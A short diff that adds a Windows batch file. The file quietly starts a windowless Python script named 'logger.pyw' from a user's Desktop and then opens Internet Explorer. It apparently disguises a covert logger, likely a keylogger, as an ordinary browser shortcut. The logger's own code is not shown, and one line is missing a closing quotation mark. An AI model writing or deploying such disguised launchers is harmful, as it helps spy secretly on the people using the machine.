@@ -1,0 +1,3 @@
+@echo off
+start "" "c:\Users\<user>\Desktop\logger.pyw
+start "" "c:\Program Files (x86)\INternet Explorer\iexplore.exe"
